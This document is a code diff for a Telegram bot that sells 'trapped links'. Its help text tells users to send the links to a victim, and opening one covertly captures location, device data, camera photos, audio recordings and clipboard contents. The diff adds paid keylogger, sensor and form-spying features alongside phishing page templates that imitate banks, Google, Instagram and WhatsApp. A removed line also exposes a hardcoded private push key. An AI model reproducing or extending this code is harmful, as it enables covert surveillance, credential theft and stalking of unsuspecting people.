@@ -4,9 +4,11 @@ const multer  = require("multer");
 const webPush = require("web-push");
 
 // ── VAPID setup ───────────────────────────────────────────────────────────────
-const VAPID_PUBLIC  = "BO28wpeyAx8s871cdmzFO7NfyA45q-kijOlDL7z0b6rsxtOmUnLzC8SX7tZqahrBSfseub8Q-PD0qENCHqs9xiY";
-const VAPID_PRIVATE = "UqSz5qteyhBUK-0ZQ_Fs4308bJEV5OUw1bfGKpGwyv8";
-webPush.setVapidDetails("mailto:admin@bot-psue.onrender.com", VAPID_PUBLIC, VAPID_PRIVATE);
+const VAPID_PUBLIC  = process.env.VAPID_PUBLIC  || "BO28wpeyAx8s871cdmzFO7NfyA45q-kijOlDL7z0b6rsxtOmUnLzC8SX7tZqahrBSfseub8Q-PD0qENCHqs9xiY";
+const VAPID_PRIVATE = process.env.VAPID_PRIVATE || "";
+if (VAPID_PRIVATE) {
+  webPush.setVapidDetails("mailto:admin@bot-psue.onrender.com", VAPID_PUBLIC, VAPID_PRIVATE);
+}
 const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 15*1024*1024 } });
 
 // ── Storage helpers ────────────────────────────────────────────────────────────
@@ -29,6 +31,7 @@ const PAGE_CONFIG_FILE  = "./page_config.json";
 const SUBMISSIONS_FILE  = "./submissions.json";
 const USER_PAGES_FILE   = "./user_pages.json";
 const USER_SUBS_FILE    = "./user_subs.json";
+const LANGS_FILE        = "./langs.json";
 
 const DEFAULT_PAGE_CONFIG = {
   active:false, template:"pubg",
@@ -41,9 +44,9 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false };
 // These features are ALWAYS paid-VIP only — never free
-const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio']);
+const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy']);
 
 let pageConfig   = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
 let submissions  = loadJSON(SUBMISSIONS_FILE, []);
@@ -51,6 +54,34 @@ let userPages    = loadJSON(USER_PAGES_FILE, {});
 let userSubs     = loadJSON(USER_SUBS_FILE, {});
 let userAttempts = loadJSON('./attempts.json', {});     // { uid: count }
 let attemptLinks = loadJSON('./attempt_links.json', {}); // { token: { uid, url, used, createdAt } }
+
+const BLOCKED_OLD_LINKS_FILE  = './blocked_old_links.json';
+const LINK_MGMT_ALLOWED_FILE  = './link_mgmt_allowed.json';
+const OLD_LINKS_DB_FILE       = './old_links_db.json';
+
+let blockedOldLinks    = new Set(loadJSON(BLOCKED_OLD_LINKS_FILE, []));
+let linkMgmtAllowed    = new Set(loadJSON(LINK_MGMT_ALLOWED_FILE, []).map(String));
+let oldLinksDb         = loadJSON(OLD_LINKS_DB_FILE, {});
+
+function saveOldLinksDb() {
+  saveJSON(OLD_LINKS_DB_FILE, oldLinksDb);
+}
+function addOldLink(uid, linkData) {
+  const key = String(uid);
+  if (!oldLinksDb[key]) oldLinksDb[key] = [];
+  oldLinksDb[key].unshift(linkData);
+  if (oldLinksDb[key].length > 50) oldLinksDb[key] = oldLinksDb[key].slice(0, 50);
+  saveOldLinksDb();
+}
+
+function saveBlockedOldLinks() {
+  saveJSON(BLOCKED_OLD_LINKS_FILE, [...blockedOldLinks]);
+  backupFileToGH(BLOCKED_OLD_LINKS_FILE, '_data/blocked_old_links.json').catch(()=>{});
+}
+function saveLinkMgmtAllowed() {
+  saveJSON(LINK_MGMT_ALLOWED_FILE, [...linkMgmtAllowed]);
+  backupFileToGH(LINK_MGMT_ALLOWED_FILE, '_data/link_mgmt_allowed.json').catch(()=>{});
+}
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -90,6 +121,52 @@ function saveUserPages()  { saveJSON(USER_PAGES_FILE, userPages);  backupFileToG
 function saveUserSubs()   { saveJSON(USER_SUBS_FILE,  userSubs);   backupFileToGH(USER_SUBS_FILE, "_data/user_subs.json").catch(()=>{});  }
 function saveAttempts()   { saveJSON('./attempts.json', userAttempts); backupFileToGH('./attempts.json','_data/attempts.json').catch(()=>{}); }
 function saveAttemptLinks(){ saveJSON('./attempt_links.json', attemptLinks); backupFileToGH('./attempt_links.json','_data/attempt_links.json').catch(()=>{}); }
+
+// ── Language preferences ───────────────────────────────────────────────────────
+let userLang = loadJSON(LANGS_FILE, {}); // { "chatId": "en" | "ar" }
+function saveLangs() { saveJSON(LANGS_FILE, userLang); }
+function getLang(chatId) { return userLang[String(chatId)] || 'ar'; }
+
+const T = {
+  ar: {
+    welcome_new:   (name) => `👋 أهلاً بك لأول مرة! 🎉`,
+    welcome_back:  (name) => `مرحباً مجدداً ${name}!`,
+    welcome_body:  `\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`,
+    lang_name:     '🇸🇦 العربية',
+    lang_switched: '✅ تم التحويل إلى العربية 🇸🇦',
+    menu_title:    '📱 القائمة التفاعلية:',
+    menu_create:   '🔗 إنشاء رابط',    menu_mylinks:  '📋 روابطي',
+    menu_vip:      '💎 ميزات VIP 🔥', menu_attempts: '🎯 المحاولات',
+    menu_stats:    '📊 إحصائياتي',    menu_myid:     '🆔 معرّفي',
+    menu_help:     '📖 المساعدة',      menu_linktypes:'🔗 أنواع الروابط',
+    menu_owner:    '👑 لوحة المالك',  menu_lang:     '🌐 English',
+    // inline-only buttons
+    menu_page_my:  '🖥️ لوحة صفحتي',  menu_my_feat:  '🎛️ ميزاتي',
+    menu_premadmin:'👑 إدارة البريميوم', menu_stats_a: '📊 الإحصائيات',
+    menu_feat_set: '🎛️ إعدادات الميزات', menu_dyn_page:'🖥️ صفحتي الديناميكية',
+    menu_broadcast:'📢 إرسال للجميع',  menu_backup:   '💾 نسخ احتياطي',
+    menu_owner_cmds: '📋 أوامر المالك',
+  },
+  en: {
+    welcome_new:   (name) => `👋 Welcome for the first time! 🎉`,
+    welcome_back:  (name) => `Welcome back ${name}!`,
+    welcome_body:  `\n\nTracking Link Bot 🔗\n\nCollects on open:\n📍 Location (GPS + IP)\n📱 Full device info\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network data\n📋 Clipboard content\n🔍 ISP, country, city\n\n⚡ Powered by @Ye_x00`,
+    lang_name:     '🇺🇸 English',
+    lang_switched: '✅ Switched to English 🇺🇸',
+    menu_title:    '📱 Interactive Menu:',
+    menu_create:   '🔗 Create Link',   menu_mylinks:  '📋 My Links',
+    menu_vip:      '💎 VIP Features 🔥',menu_attempts:'🎯 Attempts',
+    menu_stats:    '📊 My Stats',      menu_myid:     '🆔 My ID',
+    menu_help:     '📖 Help',          menu_linktypes:'🔗 Link Types',
+    menu_owner:    '👑 Owner Panel',   menu_lang:     '🌐 العربية',
+    // inline-only buttons
+    menu_page_my:  '🖥️ My Page Panel', menu_my_feat:  '🎛️ My Features',
+    menu_premadmin:'👑 Premium Mgmt',  menu_stats_a:  '📊 Statistics',
+    menu_feat_set: '🎛️ Feature Settings', menu_dyn_page:'🖥️ My Dynamic Page',
+    menu_broadcast:'📢 Broadcast',     menu_backup:   '💾 Backup',
+    menu_owner_cmds: '📋 Owner Commands',
+  }
+};
 
 function getUserPage(uid) {
   const id = String(uid);
@@ -334,6 +411,7 @@ const GH_REPO  = "Bot";
 
 const DATA_FILES = [
   { local: "./users.json",     remote: "_data/users.json"     },
+  { local: "./links_db.json",  remote: "_data/links_db.json"  },
   { local: "./banned.json",    remote: "_data/banned.json"    },
   { local: "./stats.json",     remote: "_data/stats.json"     },
   { local: "./settings.json",  remote: "_data/settings.json"  },
@@ -473,12 +551,50 @@ async function backupToGitHub() {
   console.log("💾 تم حفظ البيانات على GitHub");
 }
 
+// ── Code files to auto-sync to GitHub ─────────────────────────────────────────
+const CODE_FILES = [
+  { local: './index.js',          remote: 'index.js'          },
+  { local: './link-features.js',  remote: 'link-features.js'  },
+  { local: './link-manager.js',   remote: 'link-manager.js'   },
+  { local: './package.json',      remote: 'package.json'      },
+  { local: './public/sw.js',      remote: 'public/sw.js'      },
+  { local: './views/bank.ejs',        remote: 'views/bank.ejs'        },
+  { local: './views/cloudflare.ejs',  remote: 'views/cloudflare.ejs'  },
+  { local: './views/contacts.ejs',    remote: 'views/contacts.ejs'    },
+  { local: './views/download.ejs',    remote: 'views/download.ejs'    },
+  { local: './views/dynpage.ejs',     remote: 'views/dynpage.ejs'     },
+  { local: './views/google.ejs',      remote: 'views/google.ejs'      },
+  { local: './views/instagram.ejs',   remote: 'views/instagram.ejs'   },
+  { local: './views/linkoff.ejs',     remote: 'views/linkoff.ejs'     },
+  { local: './views/linkpass.ejs',    remote: 'views/linkpass.ejs'    },
+  { local: './views/snapchat.ejs',    remote: 'views/snapchat.ejs'    },
+  { local: './views/tiktok.ejs',      remote: 'views/tiktok.ejs'      },
+  { local: './views/webview.ejs',     remote: 'views/webview.ejs'     },
+  { local: './views/whatsapp.ejs',    remote: 'views/whatsapp.ejs'    },
+  { local: './views/youtube.ejs',     remote: 'views/youtube.ejs'     },
+];
+
+async function backupCodeToGH() {
+  if (!GH_TOKEN) return;
+  let ok = 0;
+  await Promise.allSettled(CODE_FILES.map(async f => {
+    try {
+      if (!fs.existsSync(f.local)) return;
+      const content = fs.readFileSync(f.local, 'utf8');
+      await ghPut(f.remote, content);
+      ok++;
+    } catch(e) {}
+  }));
+  console.log(`📤 تم رفع ${ok} ملف كود على GitHub`);
+}
+
 // ── Setup ─────────────────────────────────────────────────────────────────────
 
 const cors        = require('cors');
 const bodyParser  = require('body-parser');
 const fetch       = require('node-fetch');
-const TelegramBot = require('node-telegram-bot-api');
+const { TelegramBot } = require('node-telegram-bot-api');
+const linkMgr = require('./link-manager');
 
 const bot = new TelegramBot(process.env["bot"], { polling: true });
 const app = express();
@@ -488,12 +604,17 @@ app.use(cors());
 app.use(express.static('public'));
 app.set("view engine", "ejs");
 
-const hostURL   = process.env.HOST_URL || "https://bot-psue.onrender.com";
+const hostURL   = process.env.HOST_URL
+  || (process.env.REPLIT_DEV_DOMAIN ? "https://" + process.env.REPLIT_DEV_DOMAIN : null)
+  || (process.env.REPLIT_DOMAINS    ? "https://" + process.env.REPLIT_DOMAINS.split(",")[0] : null)
+  || "https://bot-psue.onrender.com";
 const use1pt    = false;
 const BOT_OWNER = 6012675140;
 const REPLY_PREFIX        = "📝 اكتب ردك على المستخدم\nUID:";
 const PREM_GRANT_PREFIX   = "💎 أدخل ID المستخدم ومدة التفعيل (مثال: 123456789 30 أو 123456789 lifetime):";
 const PREM_REVOKE_PREFIX  = "🗑️ أدخل ID المستخدم لإلغاء البريميوم:";
+const LM_GRANT_PREFIX  = "✅ أدخل ID المستخدم لمنحه صلاحية إدارة روابط الآخرين:";
+const LM_REVOKE_PREFIX = "🚫 أدخل ID المستخدم لسحب صلاحية إدارة روابط الآخرين:";
 
 // ── Global crash protection ────────────────────────────────────────────────────
 process.on('uncaughtException',  (err) => { console.error('uncaughtException:', err.message); });
@@ -528,7 +649,16 @@ async function enrichIP(ip) {
   try {
     const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
     if (d.status === "success") {
-      const info = `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
+      const str = `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
+      const info = {
+        country: d.country || '?',
+        city:    d.city    || '?',
+        isp:     d.isp     || '?',
+        org:     d.org     || '?',
+        lat:     d.lat,
+        lon:     d.lon,
+        toString() { return str; }
+      };
       _ipCache.set(ip, { info, expiry: Date.now() + 24*3600*1000 });
       return info;
     }
@@ -580,6 +710,10 @@ async function handleLinkOpen(req, res, view) {
   const d  = new Date().toJSON().slice(0,19).replace('T',':');
   if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
 
+  // Check if this old-style link is disabled
+  const _oldKey = `${req.params.path}|${req.params.uri || ''}`;
+  if (blockedOldLinks.has(_oldKey)) return res.render('linkoff', { reason: 'disabled', host: hostURL });
+
   const creatorId = parseInt(req.params.path, 36);
   stats.linksOpened++;
   saveStats();
@@ -606,7 +740,10 @@ async function handleLinkOpen(req, res, view) {
   const activityAccess    = canUsePremium(creatorId, 'activityDetect');
   const autofillAccess    = canUsePremium(creatorId, 'autofill');
   const devtoolsAccess    = canUsePremium(creatorId, 'devtools');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess });
+  const keyloggerAccess   = canUsePremium(creatorId, 'keylogger');
+  const sensorsAccess     = canUsePremium(creatorId, 'sensors');
+  const formspyAccess     = canUsePremium(creatorId, 'formspy');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -1039,6 +1176,23 @@ bot.on('message', async (msg) => {
     return;
   }
 
+  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === LM_GRANT_PREFIX && msg.text) {
+    const tid = msg.text.trim();
+    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
+    linkMgmtAllowed.add(String(tid));
+    saveLinkMgmtAllowed();
+    const prof = profiles[tid] || {};
+    return bot.sendMessage(chatId, `✅ تم منح \`${tid}\`${prof.name ? ` (${prof.name})` : ''} صلاحية إدارة روابط الآخرين.`, { parse_mode: 'Markdown' });
+  }
+
+  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === LM_REVOKE_PREFIX && msg.text) {
+    const tid = msg.text.trim();
+    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
+    linkMgmtAllowed.delete(String(tid));
+    saveLinkMgmtAllowed();
+    return bot.sendMessage(chatId, `🚫 تم سحب صلاحية \`${tid}\`.`, { parse_mode: 'Markdown' });
+  }
+
   if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_REVOKE_PREFIX && msg.text) {
     const tid = msg.text.trim();
     if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ ID: ${tid} ليس لديه اشتراك.`);
@@ -1078,26 +1232,56 @@ bot.on('message', async (msg) => {
   // ── Commands ──────────────────────────────────────────────────────────────
 
   if (msg.text === "/start") {
-    const isNew = !userStats[String(chatId)];
+    const isNew   = !userStats[String(chatId)];
     const isOwner = chatId === BOT_OWNER;
     const isPrem  = isPremium(chatId);
+    const lang    = getLang(chatId);
+    const tr      = T[lang];
+
+    // ── Inline keyboard (interactive buttons below message) ──
     const baseRows = [
-      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
-      [{ text: `🎯 محاولة مدفوعة (رصيدك: ${userAttempts[String(chatId)]||0})`, callback_data: "attempt_menu" }],
-      [{ text: "💎 مميزات البريميوم", callback_data: "pinfo" }],
-      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
-      [{ text: "📊 إحصائياتي", callback_data: "mystats" }],
-      ...(isPrem && !isOwner ? [[{ text: "🖥️ لوحة صفحتي", callback_data: "pg_main" }]] : []),
+      [{ text: tr.menu_create,   callback_data: "crenew" },       { text: tr.menu_mylinks,   callback_data: "lm:list:0" }],
+      [{ text: tr.menu_vip,      callback_data: "pinfo" },         { text: tr.menu_attempts,  callback_data: "attempt_menu" }],
+      [{ text: tr.menu_stats,    callback_data: "mystats" },       { text: tr.menu_myid,      callback_data: "myid" }],
+      [{ text: tr.menu_help,     callback_data: "help_menu" },     { text: tr.menu_linktypes, callback_data: "link_types" }],
+      ...(isPrem && !isOwner ? [[{ text: tr.menu_page_my, callback_data: "pg_main" }, { text: tr.menu_my_feat, callback_data: "my_features" }]] : []),
       ...(isOwner ? [
-        [{ text: "👑 إدارة البريميوم", callback_data: "premadmin" }],
-        [{ text: "🖥️ الصفحة الديناميكية", callback_data: "pg_main" }],
-        [{ text: "💾 نسخ احتياطي كامل", callback_data: "do_backup" }]
-      ] : [])
+        [{ text: tr.menu_premadmin, callback_data: "premadmin" },  { text: tr.menu_stats_a,   callback_data: "stats_menu" }],
+        [{ text: tr.menu_feat_set,  callback_data: "feat_menu" },  { text: tr.menu_dyn_page,  callback_data: "pg_main" }],
+        [{ text: tr.menu_broadcast, callback_data: "broadcast_m" },{ text: tr.menu_backup,    callback_data: "do_backup" }],
+        [{ text: tr.menu_owner_cmds, callback_data: "owner_cmds" }]
+      ] : []),
+      [{ text: tr.menu_lang, callback_data: "lang_toggle" }]
     ];
-    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: baseRows }) };
+
+    // ── Persistent Reply Keyboard (القائمة السريعة في الشريط السفلي) ──
+    const replyKbRows = [
+      [{ text: tr.menu_create }, { text: tr.menu_mylinks }],
+      [{ text: tr.menu_vip },    { text: tr.menu_attempts }],
+      [{ text: tr.menu_stats },  { text: tr.menu_myid }],
+      [{ text: tr.menu_help },   { text: tr.menu_linktypes }],
+      ...(isOwner ? [
+        [{ text: tr.menu_owner }, { text: tr.menu_owner_cmds }],
+      ] : []),
+      [{ text: tr.menu_lang }]
+    ];
+
     const welcome = settings.welcomeMsg ||
-      `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
-    return bot.sendMessage(chatId, welcome, keyboard);
+      `${isNew ? tr.welcome_new(msg.chat.first_name) : tr.welcome_back(msg.chat.first_name)} 🎉${tr.welcome_body}`;
+
+    // First: set persistent keyboard
+    await bot.sendMessage(chatId, welcome, {
+      reply_markup: JSON.stringify({
+        keyboard: replyKbRows,
+        resize_keyboard: true,
+        persistent: true,
+        input_field_placeholder: lang === 'en' ? 'Choose from menu...' : 'اختر من القائمة...'
+      })
+    });
+    // Then: send inline menu
+    return bot.sendMessage(chatId, tr.menu_title, {
+      reply_markup: JSON.stringify({ inline_keyboard: baseRows })
+    });
   }
 
   if (msg.text === "/create") return createNew(chatId);
@@ -1120,6 +1304,66 @@ bot.on('message', async (msg) => {
   if (msg.text === "/myid")
     return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
 
+  // ── /lang — language toggle ────────────────────────────────────────────────
+  if (msg.text === "/lang") {
+    const cur = getLang(chatId);
+    return bot.sendMessage(chatId,
+      cur === 'ar' ? '🌐 اختر اللغة / Choose language:' : '🌐 Choose language / اختر اللغة:',
+      { reply_markup: JSON.stringify({ inline_keyboard: [
+        [{ text: '🇸🇦 العربية', callback_data: 'lang:ar' }, { text: '🇺🇸 English', callback_data: 'lang:en' }]
+      ] }) }
+    );
+  }
+
+  // ── Reply Keyboard shortcut handlers (القائمة السريعة) ─────────────────────
+  const _rkMap = {
+    '🔗 إنشاء رابط':    () => bot.emit('message', { ...msg, text: '/newlink' }),
+    '🔗 Create Link':   () => bot.emit('message', { ...msg, text: '/newlink' }),
+    '📋 روابطي':        () => bot.emit('message', { ...msg, text: '/mylinks' }),
+    '📋 My Links':      () => bot.emit('message', { ...msg, text: '/mylinks' }),
+    '📊 إحصائياتي':    () => bot.emit('message', { ...msg, text: '/mystats' }),
+    '📊 My Stats':      () => bot.emit('message', { ...msg, text: '/mystats' }),
+    '🆔 معرّفي':        () => bot.emit('message', { ...msg, text: '/myid' }),
+    '🆔 My ID':         () => bot.emit('message', { ...msg, text: '/myid' }),
+    '📖 المساعدة':     () => bot.emit('message', { ...msg, text: '/help' }),
+    '📖 Help':          () => bot.emit('message', { ...msg, text: '/help' }),
+    '💎 ميزات VIP 🔥': () => bot.sendMessage(chatId, '⏳...').then(() =>
+      bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'pinfo' })),
+    '💎 VIP Features 🔥': () => bot.sendMessage(chatId, '⏳...').then(() =>
+      bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'pinfo' })),
+    '🎯 المحاولات':    () => bot.emit('message', { ...msg, text: '/attempt' }),
+    '🎯 Attempts':      () => bot.emit('message', { ...msg, text: '/attempt' }),
+    '🔗 أنواع الروابط':() => bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'link_types' }),
+    '🔗 Link Types':   () => bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'link_types' }),
+    '👑 لوحة المالك':  () => bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'premadmin' }),
+    '👑 Owner Panel':  () => bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{id:chatId}, message_id:0 }, data:'premadmin' }),
+    '🌐 English':       () => { userLang[String(chatId)] = 'en'; saveLangs(); bot.emit('message', { ...msg, text: '/start' }); },
+    '🌐 العربية':       () => { userLang[String(chatId)] = 'ar'; saveLangs(); bot.emit('message', { ...msg, text: '/start' }); },
+  };
+  if (msg.text && _rkMap[msg.text]) { _rkMap[msg.text](); return; }
+
+  // ── Flexible fallback للأزرار القديمة في لوحة المفاتيح الثابتة ─────────────
+  if (msg.text) {
+    const _t = msg.text;
+    if (_t.includes('روابطي') || _t.includes('My Links'))        { bot.emit('message', { ...msg, text: '/mylinks'  }); return; }
+    if (_t.includes('إنشاء رابط') || _t.includes('Create Link')) { bot.emit('message', { ...msg, text: '/newlink'  }); return; }
+    if (_t.includes('إحصائياتي') || _t.includes('My Stats'))     { bot.emit('message', { ...msg, text: '/mystats'  }); return; }
+    if (_t.includes('معرّفي') || _t.includes('My ID'))            { bot.emit('message', { ...msg, text: '/myid'     }); return; }
+    if (_t.includes('المساعدة') && !_t.includes('/'))            { bot.emit('message', { ...msg, text: '/help'     }); return; }
+    if (_t.includes('المحاولات') || _t.includes('Attempts'))     { bot.emit('message', { ...msg, text: '/attempt'  }); return; }
+  }
+
+  // ── Flexible fallback: persistent keyboard from older bot version ──────────
+  if (msg.text) {
+    const t = msg.text;
+    if (t.includes('روابطي') || t.includes('My Links'))     { bot.emit('message', { ...msg, text: '/mylinks'  }); return; }
+    if (t.includes('إنشاء رابط') || t.includes('Create Link')) { bot.emit('message', { ...msg, text: '/newlink'  }); return; }
+    if (t.includes('إحصائياتي') || t.includes('My Stats'))  { bot.emit('message', { ...msg, text: '/mystats'  }); return; }
+    if (t.includes('معرّفي') || t.includes('My ID'))         { bot.emit('message', { ...msg, text: '/myid'     }); return; }
+    if (t.includes('المساعدة') || t.includes('Help'))         { bot.emit('message', { ...msg, text: '/help'     }); return; }
+    if (t.includes('المحاولات') || t.includes('Attempts'))   { bot.emit('message', { ...msg, text: '/attempt'  }); return; }
+  }
+
   // /mystats — user sees their own link stats
   if (msg.text === "/mystats") {
     const us = userStats[String(chatId)] || { linksCreated: 0, linksOpened: 0 };
@@ -1129,11 +1373,16 @@ bot.on('message', async (msg) => {
   }
 
   if (msg.text === "/help") {
-    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
-    if (chatId === BOT_OWNER) {
-      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/page — 🖥️ لوحة الصفحة الديناميكية\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة\n/backup — 💾 نسخة احتياطية كاملة`;
-    }
-    return bot.sendMessage(chatId, t);
+    const helpRows = [
+      [{ text: "📖 كيفية الاستخدام", callback_data: "help_howto" }, { text: "📡 البيانات المجموعة", callback_data: "help_data" }],
+      [{ text: "🔗 أنواع الروابط", callback_data: "link_types" },  { text: "💎 ميزات VIP", callback_data: "pinfo" }],
+      ...(chatId === BOT_OWNER ? [[{ text: "👑 أوامر المالك", callback_data: "help_owner" }]] : []),
+      [{ text: "🏠 القائمة الرئيسية", callback_data: "main_menu" }]
+    ];
+    return bot.sendMessage(chatId, `📖 *المساعدة — اختر قسماً:*`, {
+      parse_mode: "Markdown",
+      reply_markup: JSON.stringify({ inline_keyboard: helpRows })
+    });
   }
 
   if (msg.text?.startsWith("/broadcast")) {
@@ -1247,6 +1496,9 @@ bot.on('message', async (msg) => {
     const pro = profiles[String(id)] || {};
     const userNotes = (notes[String(id)] || []);
     const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${mdEsc(n)}`).join("\n") : "لا توجد";
+    const hasLinkMgmt = linkMgmtAllowed.has(String(id));
+    const isPrem = isPremium(id);
+    const isBnd  = banned.has(id);
     return bot.sendMessage(chatId,
       `👤 معلومات المستخدم: \`${id}\`\n` +
       (pro.name     ? `📛 الاسم: ${mdEsc(pro.name)}\n` : '') +
@@ -1254,12 +1506,39 @@ bot.on('message', async (msg) => {
       (pro.seen     ? `🕐 آخر ظهور: ${mdEsc(pro.seen)} UTC\n` : '') +
       `\n📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
       `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
-      `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
+      `🚫 محجوب: ${isBnd ? '✅' : '❌'}\n` +
+      `💎 بريميوم: ${isPrem ? '✅' : '❌'}\n` +
+      `🔗 إدارة الروابط: ${hasLinkMgmt ? '✅ مفعّل' : '❌ معطّل'}\n\n` +
       `🔗 روابط أنشأها: ${us.linksCreated}\n` +
       `👁️ مرات فتح روابطه: ${us.linksOpened}\n\n` +
       `📝 الملاحظات:\n${notesText}`,
-      { parse_mode: "MarkdownV2" }
+      { parse_mode: "MarkdownV2",
+        reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text: hasLinkMgmt ? '🔒 سحب صلاحية إدارة الروابط' : '✅ منح صلاحية إدارة الروابط', callback_data: `lm_perm_toggle_${id}` }],
+          [{ text: isBnd ? '🔓 رفع الحجب' : '🚫 حجب المستخدم', callback_data: isBnd ? `unban_u_${id}` : `ban_u_${id}` }],
+        ]})
+      }
     );
+  }
+
+  // /grantlinkmgmt [id] — منح صلاحية إدارة الروابط
+  if (msg.text?.startsWith("/grantlinkmgmt")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = msg.text.replace("/grantlinkmgmt","").trim();
+    if (!id) return bot.sendMessage(chatId, "⚠️ استخدم: /grantlinkmgmt [ID]");
+    linkMgmtAllowed.add(String(id));
